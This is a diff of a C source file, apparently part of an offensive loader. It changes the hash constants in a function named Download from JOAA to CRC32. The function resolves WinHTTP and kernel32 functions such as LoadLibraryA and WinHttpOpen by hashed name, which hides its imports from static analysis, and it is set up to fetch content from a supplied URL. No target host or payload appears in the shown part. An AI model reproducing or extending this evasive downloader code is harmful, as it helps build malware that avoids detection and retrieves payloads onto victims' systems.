@@ -4,35 +4,23 @@
 
 #include "common.h"
 
-#define WinHttpOpen_JOAA        0x65DBB806
-#define WinHttpConnect_JOAA     0x39252400
-#define WinHttpOpenRequest_JOAA         0x3E4A27F3
-#define WinHttpSendRequest_JOAA         0x87B8DF4F
-#define WinHttpReceiveResponse_JOAA     0xC85F7D79
-#define WinHttpReadData_JOAA    0xDB080BF0
-#define WinHttpCloseHandle_JOAA         0x49189A17
-#define GetTickCount64_JOAA     0x00BB616E
-#define LoadLibraryA_JOAA       0x54C1D227
-#define KERNEL32DLL_JOAA        0xFD2AD9BD
-#define WINHTTPDLL_JOAA         0x25AE5124
-
 API_HASHING g_Api = { 0 };
 
 DWORD Download(char** response, PVOID url, PVOID endpoint, BOOL ssl)
 {
-    HANDLE kernel32_handle = GetModuleHandleH(KERNEL32DLL_JOAA);
-    g_Api.pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernel32_handle, LoadLibraryA_JOAA);
+    HANDLE kernel32_handle = GetModuleHandleH(kernel32_CRC32);
+    g_Api.pLoadLibraryA = (fnLoadLibraryA)GetProcAddressH(kernel32_handle, LoadLibraryA_CRC32);
 
     HANDLE winhttp_handle = g_Api.pLoadLibraryA("winhttp.dll");
 
-    g_Api.pWinHttpOpen = (fnWinHttpOpen)GetProcAddressH(winhttp_handle, WinHttpOpen_JOAA);
-    g_Api.pWinHttpConnect = (fnWinHttpConnect)GetProcAddressH(winhttp_handle, WinHttpConnect_JOAA);
-    g_Api.pWinHttpOpenRequest = (fnWinHttpOpenRequest)GetProcAddressH(winhttp_handle, WinHttpOpenRequest_JOAA);
-    g_Api.pWinHttpSendRequest = (fnWinHttpSendRequest)GetProcAddressH(winhttp_handle, WinHttpSendRequest_JOAA);
-    g_Api.pWinHttpReceiveResponse = (fnWinHttpReceiveResponse)GetProcAddressH(winhttp_handle, WinHttpReceiveResponse_JOAA);
-    g_Api.pWinHttpReadData = (fnWinHttpReadData)GetProcAddressH(winhttp_handle, WinHttpReadData_JOAA);
-    g_Api.pWinHttpCloseHandle = (fnWinHttpCloseHandle)GetProcAddressH(winhttp_handle, WinHttpCloseHandle_JOAA);
-    g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(KERNEL32DLL_JOAA), GetTickCount64_JOAA);
+    g_Api.pWinHttpOpen = (fnWinHttpOpen)GetProcAddressH(winhttp_handle, WinHttpOpen_CRC32);
+    g_Api.pWinHttpConnect = (fnWinHttpConnect)GetProcAddressH(winhttp_handle, WinHttpConnect_CRC32);
+    g_Api.pWinHttpOpenRequest = (fnWinHttpOpenRequest)GetProcAddressH(winhttp_handle, WinHttpOpenRequest_CRC32);
+    g_Api.pWinHttpSendRequest = (fnWinHttpSendRequest)GetProcAddressH(winhttp_handle, WinHttpSendRequest_CRC32);
+    g_Api.pWinHttpReceiveResponse = (fnWinHttpReceiveResponse)GetProcAddressH(winhttp_handle, WinHttpReceiveResponse_CRC32);
+    g_Api.pWinHttpReadData = (fnWinHttpReadData)GetProcAddressH(winhttp_handle, WinHttpReadData_CRC32);
+    g_Api.pWinHttpCloseHandle = (fnWinHttpCloseHandle)GetProcAddressH(winhttp_handle, WinHttpCloseHandle_CRC32);
+    g_Api.pGetTickCount64 = (fnGetTickCount64)GetProcAddressH(GetModuleHandleH(kernel32_CRC32), GetTickCount64_CRC32);
 
     if (g_Api.pGetTickCount64 == NULL) printf("GetTickCount64\n");
     if (g_Api.pWinHttpOpen == NULL) printf("WinHttpOpen\n");
